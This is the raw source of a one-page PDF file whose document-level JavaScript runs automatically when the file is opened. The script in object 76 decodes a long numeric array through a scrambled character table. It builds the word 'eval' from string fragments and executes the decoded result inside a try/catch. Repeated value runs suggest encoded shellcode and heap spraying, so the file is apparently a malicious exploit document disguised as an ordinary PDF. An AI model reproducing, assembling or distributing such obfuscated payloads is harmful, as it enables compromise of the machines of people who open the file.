%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 4/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 4/Filter/FlateDecode/Type/Contents>>
stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[16,
12,
46,
72,
65,
28,
1,
10,
4,
21,
55,
55,
1,
10,
9,
62,
73,
59,
1,
10,
4,
7,
9,
62,
1,
10,
67,
7,
73,
59,
1,
10,
73,
13,
21,
59,
1,
10,
21,
21,
7,
9,
1,
10,
55,
59,
62,
64,
1,
10,
59,
64,
4,
16,
1,
10,
4,
16,
21,
64,
1,
10,
64,
62,
59,
64,
1,
10,
67,
64,
4,
16,
1,
10,
7,
55,
27,
62,
1,
10,
67,
55,
4,
16,
1,
10,
21,
21,
64,
4,
1,
10,
55,
55,
2,
16,
1,
10,
7,
73,
4,
16,
1,
10,
64,
21,
21,
62,
1,
10,
21,
21,
67,
59,
1,
10,
4,
27,
0,
62,
1,
10,
27,
7,
73,
73,
1,
10,
9,
9,
27,
64,
1,
10,
16,
4,
9,
9,
1,
10,
59,
64,
4,
16,
1,
10,
62,
21,
21,
64,
1,
10,
21,
13,
59,
55,
1,
10,
67,
7,
64,
55,
1,
10,
4,
67,
9,
16,
1,
10,
0,
59,
21,
59,
1,
10,
73,
59,
4,
7,
1,
10,
7,
27,
67,
7,
1,
10,
73,
16,
73,
13,
1,
10,
7,
27,
59,
62,
1,
10,
4,
16,
7,
55,
1,
10,
21,
62,
67,
7,
1,
10,
67,
59,
4,
16,
1,
10,
67,
4,
21,
7,
1,
10,
9,
7,
64,
21,
1,
10,
4,
16,
7,
55,
1,
10,
0,
64,
67,
55,
1,
10,
9,
7,
64,
21,
1,
10,
62,
13,
21,
21,
1,
10,
59,
27,
59,
13,
1,
10,
39,
2,
9,
62,
1,
10,
62,
7,
64,
21,
1,
10,
2,
16,
21,
21,
1,
10,
16,
73,
64,
9,
1,
10,
21,
4,
27,
64,
1,
10,
67,
59,
9,
0,
1,
10,
62,
27,
64,
4,
1,
10,
64,
2,
62,
16,
1,
10,
2,
39,
64,
21,
1,
10,
73,
16,
59,
64,
1,
10,
21,
16,
9,
27,
1,
10,
67,
7,
27,
9,
1,
10,
7,
73,
73,
55,
1,
10,
7,
73,
4,
16,
1,
10,
64,
21,
0,
59,
1,
10,
55,
55,
2,
2,
1,
10,
64,
62,
4,
16,
1,
10,
4,
2,
59,
16,
1,
10,
73,
62,
59,
55,
1,
10,
7,
59,
9,
9,
1,
10,
64,
62,
0,
59,
1,
10,
2,
4,
4,
16,
1,
10,
2,
2,
64,
21,
1,
10,
64,
59,
4,
16,
1,
10,
64,
21,
4,
16,
1,
10,
39,
16,
62,
7,
1,
10,
7,
13,
7,
73,
1,
10,
73,
16,
62,
21,
1,
10,
39,
2,
7,
21,
1,
10,
55,
4,
4,
16,
1,
10,
4,
64,
0,
64,
1,
10,
64,
62,
67,
2,
1,
10,
67,
59,
21,
21,
1,
10,
13,
55,
64,
21,
1,
10,
9,
21,
73,
16,
1,
10,
55,
4,
4,
16,
1,
10,
4,
16,
64,
4,
1,
10,
55,
39,
9,
67,
1,
10,
7,
13,
64,
7,
1,
10,
13,
4,
73,
4,
1,
10,
9,
9,
9,
9,
1,
10,
73,
0,
9,
9,
1,
10,
73,
4,
9,
13,
1,
10,
64,
64,
64,
64,
1,
10,
64,
64,
64,
64,
1,
10,
7,
64,
7,
4,
1,
10,
59,
64,
55,
39,
1,
10,
9,
9,
55,
4,
1,
10,
64,
64,
64,
64,
1,
10,
7,
64,
64,
64,
1,
10,
62,
64,
4,
21,
1,
10,
7,
64,
27,
13,
1,
10,
4,
16,
7,
7,
1,
10,
4,
16,
73,
62,
1,
10,
27,
64,
7,
73,
1,
10,
62,
21,
4,
21,
1,
10,
9,
9,
64,
7,
1,
10,
55,
4,
73,
21,
1,
10,
55,
73,
55,
9,
1,
10,
64,
64,
64,
64,
1,
10,
67,
7,
55,
4,
1,
10,
55,
62,
67,
0,
1,
10,
7,
59,
55,
2,
1,
10,
27,
55,
9,
9,
1,
10,
62,
59,
4,
21,
1,
10,
4,
16,
64,
4,
1,
10,
73,
4,
73,
4,
1,
10,
9,
9,
55,
27,
1,
10,
9,
9,
9,
9,
1,
10,
64,
0,
73,
16,
1,
10,
67,
0,
73,
16,
1,
10,
73,
62,
4,
27,
1,
10,
64,
27,
64,
59,
1,
10,
64,
64,
64,
64,
1,
10,
7,
62,
4,
2,
1,
10,
64,
62,
0,
59,
1,
10,
64,
59,
62,
67,
1,
10,
67,
0,
0,
59,
1,
10,
55,
67,
55,
7,
1,
10,
62,
67,
67,
21,
1,
10,
0,
59,
59,
59,
1,
10,
67,
55,
64,
59,
1,
10,
21,
21,
67,
0,
1,
10,
62,
67,
21,
0,
1,
10,
0,
59,
59,
59,
1,
10,
0,
64,
64,
4,
1,
10,
67,
21,
0,
2,
1,
10,
7,
21,
0,
64,
1,
10,
9,
4,
55,
4,
1,
10,
64,
64,
64,
64,
1,
10,
9,
9,
64,
64,
1,
10,
64,
62,
7,
55,
1,
10,
73,
4,
4,
16,
1,
10,
62,
13,
21,
21,
1,
10,
62,
67,
7,
27,
1,
10,
27,
2,
59,
59,
1,
10,
67,
67,
64,
64,
1,
10,
55,
0,
67,
64,
1,
10,
62,
67,
67,
59,
1,
10,
27,
2,
59,
59,
1,
10,
0,
73,
64,
7,
1,
10,
55,
62,
55,
59,
1,
10,
62,
55,
55,
62,
1,
10,
27,
2,
59,
59,
1,
10,
64,
64,
64,
13,
1,
10,
4,
39,
7,
13,
1,
10,
64,
59,
62,
27,
1,
10,
4,
4,
21,
64,
1,
10,
27,
2,
59,
59,
1,
10,
59,
27,
64,
59,
1,
10,
55,
39,
7,
27,
1,
10,
55,
39,
64,
64,
1,
10,
7,
21,
64,
64,
1,
10,
55,
39,
7,
67,
1,
10,
9,
9,
64,
64,
1,
10,
27,
59,
7,
55,
1,
10,
62,
64,
4,
7,
1,
10,
27,
55,
67,
7,
1,
10,
64,
64,
55,
39,
1,
10,
9,
9,
7,
21,
1,
10,
64,
59,
7,
55,
1,
10,
64,
64,
55,
39,
1,
10,
73,
16,
4,
21,
1,
10,
7,
21,
64,
62,
1,
10,
7,
55,
9,
9,
1,
10,
4,
21,
64,
59,
1,
10,
64,
62,
62,
21,
1,
10,
64,
0,
73,
16,
1,
10,
27,
21,
73,
16,
1,
10,
4,
64,
59,
67,
1,
10,
64,
64,
21,
9,
1,
10,
9,
39,
67,
7,
1,
10,
4,
64,
59,
67,
1,
10,
64,
64,
21,
9,
1,
10,
62,
59,
67,
7,
1,
10,
64,
64,
55,
39,
1,
10,
9,
73,
55,
39,
1,
10,
7,
55,
9,
9,
1,
10,
73,
4,
64,
4,
1,
10,
9,
73,
13,
62,
1,
10,
9,
9,
9,
9,
1,
10,
59,
73,
4,
73,
1,
10,
73,
62,
64,
73,
1,
10,
9,
73,
13,
4,
1,
10,
64,
73,
4,
39,
1,
10,
55,
9,
4,
13,
1,
10,
16,
2,
64,
27,
1,
10,
62,
39,
21,
21,
1,
10,
7,
16,
4,
39,
1,
10,
62,
55,
27,
16,
1,
10,
67,
13,
59,
55,
1,
10,
27,
39,
21,
55,
1,
10,
67,
64,
0,
9,
1,
10,
67,
59,
55,
4,
1,
10,
67,
64,
67,
59,
1,
10,
0,
9,
21,
39,
1,
10,
21,
67,
0,
9,
1,
10,
0,
73,
21,
13,
1,
10,
21,
21,
21,
27,
1,
10,
0,
73,
21,
67,
1,
10,
21,
21,
21,
0,
1,
10,
0,
73,
21,
67,
1,
10,
21,
55,
21,
55,
1,
10,
55,
21,
0,
9,
1,
10,
67,
64,
0,
73,
1,
10,
67,
64,
55,
4,
1,
10,
55,
55,
21,
9,
1,
10,
21,
4,
21,
2,
1,
10,
0,
55,
21,
67,
1,
10,
21,
2,
55,
7,
1,
10,
64,
64,
21,
21,
1,
10,
64,
64,
64,
64,
28,
22,
9,
10,
45,
62,
66,
69,
52,
45,
38,
73,
36,
42,
18,
3,
18,
39,
15,
54,
33,
40,
58,
8,
51,
69,
48,
73,
3,
18,
39,
26,
48,
73,
45,
72,
66,
51,
56,
0,
24,
54,
33,
40,
58,
18,
39,
32,
65,
18,
39,
22,
25,
18,
39,
65,
18,
39,
26,
46,
10,
16,
46,
66,
18,
69,
45,
72,
3,
64,
15,
54,
33,
30,
0,
40,
22,
18,
73,
66,
10,
18,
45,
38,
18,
39,
22,
25,
38,
9,
10,
45,
62,
66,
69,
52,
45,
38,
16,
14,
3,
40,
58,
42,
39,
18,
38,
2,
19,
72,
65,
45,
73,
8,
38,
34,
18,
18,
39,
33,
3,
40,
22,
42,
39,
18,
38,
42,
8,
65,
64,
14,
64,
62,
64,
62,
64,
62,
64,
62,
22,
42,
39,
18,
38,
39,
2,
2,
18,
65,
64,
14,
59,
64,
64,
64,
64,
64,
22,
42,
39,
18,
38,
11,
39,
33,
48,
52,
39,
2,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
16,
12,
46,
72,
40,
22,
42,
39,
18,
38,
46,
62,
43,
48,
73,
45,
65,
11,
39,
33,
48,
52,
39,
2,
26,
48,
73,
45,
72,
66,
51,
56,
0,
22,
42,
39,
18,
38,
54,
33,
65,
39,
2,
2,
18,
20,
3,
46,
62,
43,
48,
73,
45,
32,
64,
14,
21,
4,
40,
22,
42,
39,
18,
38,
33,
39,
18,
46,
11,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
44,
1,
10,
13,
64,
13,
64,
1,
10,
13,
64,
13,
64,
44,
40,
22,
33,
39,
18,
46,
11,
65,
73,
36,
42,
18,
3,
33,
39,
18,
46,
11,
15,
54,
33,
40,
22,
42,
39,
18,
38,
62,
52,
10,
45,
66,
0,
65,
3,
42,
8,
20,
64,
14,
59,
64,
64,
64,
64,
64,
40,
30,
39,
2,
2,
18,
22,
9,
52,
18,
3,
42,
39,
18,
38,
62,
52,
10,
45,
66,
65,
64,
22,
62,
52,
10,
45,
66,
24,
62,
52,
10,
45,
66,
0,
22,
62,
52,
10,
45,
66,
32,
32,
40,
58,
2,
19,
72,
17,
62,
52,
10,
45,
66,
68,
65,
33,
39,
18,
46,
11,
32,
11,
39,
33,
48,
52,
39,
2,
22,
25,
38,
42,
39,
18,
38,
52,
42,
73,
18,
9,
48,
52,
8,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
44,
1,
10,
64,
62,
64,
62,
1,
10,
64,
62,
64,
62,
44,
40,
22,
8,
51,
69,
48,
73,
3,
52,
42,
73,
18,
9,
48,
52,
8,
26,
48,
73,
45,
72,
66,
51,
24,
59,
59,
13,
7,
0,
40,
58,
52,
42,
73,
18,
9,
48,
52,
8,
32,
65,
52,
42,
73,
18,
9,
48,
52,
8,
22,
25,
38,
66,
51,
69,
46,
26,
62,
52,
48,
48,
39,
16,
31,
66,
52,
18,
73,
65,
75,
52,
48,
48,
39,
16,
26,
62,
52,
48,
48,
73,
62,
66,
60,
41,
39,
69,
48,
70,
45,
9,
52,
3,
58,
46,
10,
16,
12,
49,
44,
44,
15,
41,
46,
72,
49,
52,
42,
73,
18,
9,
48,
52,
8,
25,
40,
22,
25,
38,
9,
10,
45,
62,
66,
69,
52,
45,
38,
11,
18,
69,
45,
66,
9,
3,
40,
58,
45,
52,
11,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
44,
1,
10,
64,
34,
64,
34,
1,
10,
64,
34,
64,
34,
1,
10,
64,
34,
64,
34,
1,
10,
64,
34,
64,
34,
44,
40,
22,
42,
39,
18,
38,
11,
39,
33,
48,
52,
39,
2,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
16,
12,
46,
72,
40,
22,
51,
73,
39,
11,
16,
48,
52,
62,
19,
65,
45,
52,
11,
32,
11,
39,
33,
48,
52,
39,
2,
22,
16,
69,
72,
16,
48,
52,
62,
19,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
44,
1,
10,
64,
34,
64,
34,
1,
10,
64,
34,
64,
34,
44,
40,
22,
51,
73,
39,
2,
73,
18,
46,
69,
36,
73,
65,
0,
64,
22,
46,
11,
18,
39,
33,
65,
51,
73,
39,
2,
73,
18,
46,
69,
36,
73,
32,
51,
73,
39,
11,
16,
48,
52,
62,
19,
26,
48,
73,
45,
72,
66,
51,
22,
8,
51,
69,
48,
73,
3,
16,
69,
72,
16,
48,
52,
62,
19,
26,
48,
73,
45,
72,
66,
51,
24,
46,
11,
18,
39,
33,
40,
58,
16,
69,
72,
16,
48,
52,
62,
19,
32,
65,
16,
69,
72,
16,
48,
52,
62,
19,
22,
25,
38,
9,
69,
48,
48,
16,
48,
52,
62,
19,
65,
16,
69,
72,
16,
48,
52,
62,
19,
26,
46,
10,
16,
46,
66,
18,
69,
45,
72,
3,
64,
15,
46,
11,
18,
39,
33,
40,
22,
16,
48,
52,
62,
19,
65,
16,
69,
72,
16,
48,
52,
62,
19,
26,
46,
10,
16,
46,
66,
18,
69,
45,
72,
3,
64,
15,
16,
69,
72,
16,
48,
52,
62,
19,
26,
48,
73,
45,
72,
66,
51,
20,
46,
11,
18,
39,
33,
40,
22,
8,
51,
69,
48,
73,
3,
16,
48,
52,
62,
19,
26,
48,
73,
45,
72,
66,
51,
32,
46,
11,
18,
39,
33,
24,
64,
14,
59,
64,
64,
64,
64,
40,
58,
16,
48,
52,
62,
19,
65,
16,
48,
52,
62,
19,
32,
16,
48,
52,
62,
19,
32,
9,
69,
48,
48,
16,
48,
52,
62,
19,
22,
25,
38,
41,
73,
41,
65,
45,
73,
8,
38,
34,
18,
18,
39,
33,
3,
40,
22,
9,
52,
18,
3,
69,
65,
64,
22,
69,
24,
27,
59,
64,
64,
22,
69,
32,
32,
40,
58,
41,
73,
41,
17,
69,
68,
65,
16,
48,
52,
62,
19,
32,
51,
73,
39,
11,
16,
48,
52,
62,
19,
22,
25,
38,
42,
39,
18,
38,
45,
10,
41,
65,
27,
0,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
4,
22,
10,
66,
69,
48,
26,
11,
18,
69,
45,
66,
9,
3,
44,
1,
59,
7,
64,
64,
64,
9,
44,
15,
45,
10,
41,
40,
22,
25,
38,
9,
10,
45,
62,
66,
69,
52,
45,
38,
72,
73,
66,
69,
62,
52,
45,
3,
40,
58,
42,
39,
18,
38,
39,
18,
18,
33,
65,
45,
73,
8,
38,
34,
18,
18,
39,
33,
3,
40,
22,
69,
9,
3,
39,
11,
11,
26,
2,
52,
62,
26,
75,
52,
48,
48,
39,
16,
26,
72,
73,
66,
70,
62,
52,
45,
40,
58,
42,
39,
18,
38,
11,
39,
33,
48,
52,
39,
2,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
16,
12,
46,
72,
40,
22,
42,
39,
18,
38,
51,
57,
54,
7,
64,
64,
75,
5,
65,
11,
39,
33,
48,
52,
39,
2,
26,
48,
73,
45,
72,
66,
51,
56,
0,
22,
42,
39,
18,
38,
54,
33,
65,
64,
14,
59,
64,
64,
64,
64,
64,
20,
3,
51,
57,
54,
7,
64,
64,
75,
5,
32,
64,
14,
21,
4,
40,
22,
42,
39,
18,
38,
33,
39,
18,
46,
11,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
44,
1,
10,
13,
64,
13,
64,
1,
10,
13,
64,
13,
64,
44,
40,
22,
33,
39,
18,
46,
11,
65,
73,
36,
42,
18,
3,
33,
39,
18,
46,
11,
15,
54,
33,
40,
22,
42,
39,
18,
38,
11,
7,
34,
12,
74,
55,
7,
9,
65,
3,
64,
14,
64,
62,
64,
62,
64,
62,
64,
62,
20,
64,
14,
59,
64,
64,
64,
64,
64,
40,
30,
64,
14,
59,
64,
64,
64,
64,
64,
22,
9,
52,
18,
3,
42,
39,
18,
38,
42,
54,
62,
23,
47,
13,
55,
33,
65,
64,
22,
42,
54,
62,
23,
47,
13,
55,
33,
24,
11,
7,
34,
12,
74,
55,
7,
9,
22,
42,
54,
62,
23,
47,
13,
55,
33,
32,
32,
40,
58,
39,
18,
18,
33,
17,
42,
54,
62,
23,
47,
13,
55,
33,
68,
65,
33,
39,
18,
46,
11,
32,
11,
39,
33,
48,
52,
39,
2,
22,
25,
38,
42,
39,
18,
38,
66,
50,
29,
51,
5,
16,
37,
8,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
44,
1,
64,
13,
44,
40,
22,
8,
51,
69,
48,
73,
3,
66,
50,
29,
51,
5,
16,
37,
8,
26,
48,
73,
45,
72,
66,
51,
24,
64,
14,
59,
64,
64,
64,
40,
58,
66,
50,
29,
51,
5,
16,
37,
8,
32,
65,
66,
50,
29,
51,
5,
16,
37,
8,
22,
25,
38,
66,
50,
29,
51,
5,
16,
37,
8,
65,
44,
5,
26,
44,
32,
66,
50,
29,
51,
5,
16,
37,
8,
22,
39,
11,
11,
26,
2,
52,
62,
26,
75,
52,
48,
48,
39,
16,
26,
72,
73,
66,
70,
62,
52,
45,
3,
66,
50,
29,
51,
5,
16,
37,
8,
40,
22,
25,
25,
38,
39,
61,
48,
10,
72,
69,
45,
46,
65,
39,
11,
11,
26,
11,
48,
10,
72,
70,
45,
46,
22,
42,
39,
18,
38,
46,
42,
65,
11,
39,
18,
46,
73,
70,
45,
66,
3,
39,
11,
11,
26,
42,
69,
73,
8,
73,
18,
71,
73,
18,
46,
69,
52,
45,
26,
66,
52,
31,
66,
18,
69,
45,
72,
3,
40,
26,
62,
51,
39,
18,
34,
66,
3,
64,
40,
40,
22,
9,
52,
18,
3,
42,
39,
18,
38,
69,
65,
64,
22,
69,
24,
39,
61,
48,
10,
72,
69,
45,
46,
26,
48,
73,
45,
72,
66,
51,
22,
69,
32,
32,
40,
58,
69,
9,
3,
39,
61,
48,
10,
72,
69,
45,
46,
17,
69,
68,
26,
45,
39,
41,
73,
65,
65,
28,
60,
31,
62,
18,
69,
11,
66,
28,
40,
58,
42,
39,
18,
38,
48,
42,
65,
39,
61,
48,
10,
72,
69,
45,
46,
17,
69,
68,
26,
42,
73,
18,
46,
69,
52,
45,
22,
25,
25,
38,
69,
9,
3,
3,
48,
42,
65,
65,
13,
40,
35,
35,
3,
3,
46,
42,
65,
65,
4,
40,
6,
6,
3,
48,
42,
24,
65,
4,
26,
27,
0,
40,
40,
40,
58,
72,
73,
66,
69,
62,
52,
45,
3,
40,
22,
25,
73,
48,
46,
73,
38,
69,
9,
3,
48,
42,
65,
65,
67,
26,
27,
40,
58,
11,
18,
69,
45,
66,
9,
3,
40,
22,
25,
73,
48,
46,
73,
38,
69,
9,
3,
3,
3,
46,
42,
65,
65,
55,
40,
35,
35,
3,
46,
42,
65,
65,
67,
40,
40,
6,
6,
3,
48,
42,
24,
67,
26,
27,
27,
40,
40,
58,
16,
14,
3,
40,
22,
25,
73,
48,
46,
73,
38,
69,
9,
3,
3,
48,
42,
63,
65,
13,
26,
27,
40,
35,
35,
3,
48,
42,
24,
65,
13,
26,
0,
40,
35,
35,
3,
48,
42,
63,
65,
4,
26,
27,
21,
40,
35,
35,
3,
48,
42,
24,
65,
4,
26,
27,
67,
40,
40,
58,
9,
10,
45,
62,
66,
69,
52,
45,
38,
39,
3,
40,
58,
10,
66,
69,
48,
26,
11,
18,
69,
45,
66,
2,
3,
28,
11,
53,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
27,
38,
49,
38,
33,
33,
33,
33,
27,
27,
27,
28,
15,
45,
73,
8,
38,
47,
39,
66,
73,
3,
40,
40,
22,
25,
42,
39,
18,
38,
51,
65,
39,
11,
11,
26,
11,
48,
10,
72,
70,
45,
46,
22,
9,
52,
18,
3,
42,
39,
18,
38,
9,
65,
64,
22,
9,
24,
51,
26,
48,
73,
45,
72,
66,
51,
22,
9,
32,
32,
40,
58,
69,
9,
3,
51,
17,
9,
68,
26,
45,
39,
41,
73,
65,
65,
28,
60,
31,
62,
18,
69,
11,
66,
28,
40,
58,
42,
39,
18,
38,
69,
65,
51,
17,
9,
68,
26,
42,
73,
18,
46,
69,
52,
45,
22,
25,
25,
38,
69,
9,
3,
3,
69,
63,
4,
26,
27,
0,
40,
6,
6,
3,
69,
24,
4,
26,
0,
40,
40,
58,
62,
65,
45,
73,
8,
38,
34,
18,
18,
39,
33,
3,
40,
22,
42,
39,
18,
38,
2,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
28,
1,
10,
13,
64,
13,
64,
1,
10,
13,
64,
13,
64,
28,
40,
22,
42,
39,
18,
38,
73,
65,
10,
45,
73,
46,
62,
39,
11,
73,
3,
16,
12,
46,
72,
40,
22,
8,
51,
69,
48,
73,
3,
2,
26,
48,
73,
45,
72,
66,
51,
24,
65,
64,
14,
4,
64,
64,
64,
40,
58,
2,
32,
65,
2,
22,
25,
2,
65,
2,
26,
46,
10,
16,
46,
66,
18,
3,
64,
15,
64,
14,
4,
64,
64,
64,
20,
73,
26,
48,
73,
45,
72,
66,
51,
40,
22,
9,
52,
18,
3,
9,
65,
64,
22,
9,
24,
0,
13,
64,
64,
22,
9,
32,
32,
40,
58,
62,
17,
9,
68,
65,
2,
32,
73,
22,
25,
39,
3,
40,
22,
39,
3,
40,
22,
66,
18,
33,
58,
66,
51,
69,
46,
26,
41,
73,
2,
69,
39,
26,
45,
73,
8,
61,
48,
39,
33,
73,
18,
3,
45,
10,
48,
48,
40,
22,
25,
62,
39,
66,
62,
51,
3,
73,
40,
58,
25,
39,
3,
40,
22,
25,
25];
cc={q:"2%d\(8N&5wfupj9x,b[rk-3;Q<}.1'M/S+yA|zG a\)mv_'nsDl:Uho@q6*W{4EPc>0=t7]iIVgeKC"}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3848<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 12
trailer
<</Size 12
/Root 21 0 R>>
xref
0 0
trailer
<</Size 12/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF